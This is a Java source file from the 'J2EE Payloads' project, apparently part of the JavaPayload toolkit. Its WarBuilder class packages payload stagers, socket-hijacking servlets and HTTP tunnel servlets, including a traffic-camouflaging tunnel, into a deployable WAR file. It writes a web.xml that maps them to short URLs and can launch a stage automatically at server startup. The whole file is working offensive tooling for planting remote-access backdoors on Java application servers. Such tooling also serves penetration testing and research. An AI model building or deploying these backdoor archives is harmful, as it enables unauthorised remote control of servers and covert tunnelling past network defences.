/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.builder;

import j2eepayload.servlet.ApacheFindSockServlet;
import j2eepayload.servlet.CamouflageTunnelServlet;
import j2eepayload.servlet.FindSockServlet;
import j2eepayload.servlet.PayloadServlet;
import j2eepayload.servlet.TunnelServlet;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.zip.ZipEntry;

import javapayload.builder.JarBuilder;
import javapayload.stager.Stager;

public class WarBuilder {

	public static void main(String[] args) throws Exception {
		if (args.length == 0) {
			System.out.println("Usage: java j2eepayload.builder.WarBuilder [<filename>.war] <stager> [<moreStagers...>] [-- <startupStage> <stageOptions>]");
			return;
		}
		StringBuffer warName = new StringBuffer(); 
		boolean usePayload = false, useTunnel = false, useCamouflageTunnel = false, useFindSock = false, useApacheFindSock = false;
		final List classes = new ArrayList();
		int startupArgsStart = -1;
		boolean named = false;
		for (int i = 0; i < args.length; i++) {
			if (i == 0 && args[i].endsWith(".war")) {
				warName.append(args[i].substring(0, args[i].length()-4));
				named = true;
				continue;
			}
			if (args[i].equals("--")) {
				startupArgsStart = i+1;
				break;
			}
			if (!named) {
				if (i > 0)
					warName.append('_');
				warName.append(args[i]);
			}
			if (args[i].equals("ServletFindSock")) {
				useFindSock = true;
				classes.add(j2eepayload.servlet.FindSockServlet.class);
			} else if (args[i].equals("ServletApacheFindSock")) {
				useApacheFindSock = true;
				classes.add(j2eepayload.servlet.ApacheFindSockServlet.class);
				classes.add(j2eepayload.servlet.ApacheFindSockServlet.AprSocketInputStream.class);
				classes.add(j2eepayload.servlet.ApacheFindSockServlet.AprSocketOutputStream.class);
			} else if (args[i].equals("ServletTunnel")) {
				useTunnel = true;
			} else if (args[i].equals("ServletCamouflageTunnel")) {
				useCamouflageTunnel = true;
				classes.add(j2eepayload.servlet.CamouflageTunnelServlet.class);
				classes.add(jtcpfwd.util.EnglishWordCoder.class);
			} else {
				if (!usePayload) {
					usePayload = true;
					classes.add(j2eepayload.servlet.PayloadServlet.class);
					classes.add(j2eepayload.servlet.PayloadServlet.PayloadRunner.class);
				}
				classes.add(Class.forName("javapayload.stager." + args[i]));
			}
		}
		if (useTunnel || useCamouflageTunnel) {
			classes.add(jtcpfwd.util.PollingHandler.class);
			classes.add(jtcpfwd.util.PollingHandler.OutputStreamHandler.class);
			classes.add(jtcpfwd.util.http.HTTPTunnelEngine.class);
			classes.add(jtcpfwd.util.http.PollingHandlerFactory.class);
			classes.add(j2eepayload.servlet.TunnelServlet.class);
			classes.add(j2eepayload.servlet.TunnelServlet.PayloadRunner.class);			
			classes.add(jtcpfwd.util.http.StreamingHTTPTunnelEngine.class);
			classes.add(jtcpfwd.util.http.CamouflageHTTPTunnelEngine.class);
		}
		if (useTunnel || useCamouflageTunnel || useFindSock || useApacheFindSock) 
			classes.add(javapayload.stager.LocalTest.class);
		if (useTunnel || useCamouflageTunnel || usePayload || useFindSock || useApacheFindSock) 
			classes.add(Stager.class);
		String startupArgs = null;
		if (startupArgsStart != -1) {
			StringBuffer sb = new StringBuffer();
			for (int i = startupArgsStart; i < args.length; i++) {
				if (sb.length() > 0)
					sb.append(" ");
				sb.append(args[i]);
			}
			startupArgs = sb.toString();
		}
		String webXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" + 
		"<web-app>\r\n"; 
		if (usePayload)
			webXml += getServletEntry("PayloadServlet", PayloadServlet.class, "/jp", startupArgs);
		if (useFindSock)
			webXml += getServletEntry("FindSockServlet", FindSockServlet.class, "/jpf", null);
		if (useApacheFindSock)
			webXml += getServletEntry("ApacheFindSockServlet", ApacheFindSockServlet.class, "/apache/jpf", null);
		if (useTunnel)
			webXml += getServletEntry("TunnelServlet", TunnelServlet.class, "/jpt", null);
		if (useCamouflageTunnel)
			webXml += getServletEntry("CamouflageTunnelServlet", CamouflageTunnelServlet.class, "/jpc", null);
		webXml += "</web-app>";
		buildWar(warName.append(".war").toString(), (Class[]) classes.toArray(new Class[classes.size()]), webXml);
	}

	private static String getServletEntry(String name, Class clazz, String url, String startupArgs) {
		String startupXml = "";
		if (startupArgs != null) {
			startupXml = "    <init-param>\r\n" + 
			"    	<param-name>startup</param-name>\r\n" + 
			"    	<param-value>" + startupArgs + "</param-value>\r\n" + 
			"    </init-param>\r\n" + 
			"    <load-on-startup>1</load-on-startup>\r\n";
		}
		return "  <servlet>\r\n" + 
		"    <servlet-name>" + name + "</servlet-name>\r\n" + 
		"    <servlet-class>" + clazz.getName() + "</servlet-class>\r\n" +
		startupXml +
		"  </servlet>\r\n" + 
		"  <servlet-mapping>\r\n" + 
		"    <servlet-name>" + name + "</servlet-name>\r\n" + 
		"    <url-pattern>" + url + "</url-pattern>\r\n" + 
		"  </servlet-mapping>\r\n";
	}

	protected static void buildWar(String filename, Class[] classes, String webXml) throws Exception {
		Manifest manifest = new Manifest();
		manifest.getMainAttributes().putValue("Manifest-Version", "1.0");
		final JarOutputStream jos = new JarOutputStream(new FileOutputStream(filename), manifest);
		addClasses(jos, "WEB-INF/classes/", classes);
		jos.putNextEntry(new ZipEntry("WEB-INF/web.xml"));
		jos.write(webXml.getBytes("UTF-8"));
		jos.close();
	}
	
	public static void addClasses(final JarOutputStream jos, final String prefix, Class[] classes) throws IOException {
		// TODO update this for JavaPayload 0.3 or later
		final byte[] buf = new byte[4096];
		int len;
		for (int i = 0; i < classes.length; i++) {
			final String classname = classes[i].getName().replace('.', '/') + ".class";
			jos.putNextEntry(new ZipEntry(prefix+classname));
			final InputStream in = JarBuilder.class.getResourceAsStream("/" + classname);
			while ((len = in.read(buf)) != -1) {
				jos.write(buf, 0, len);
			}
			in.close();
		}
	}
}
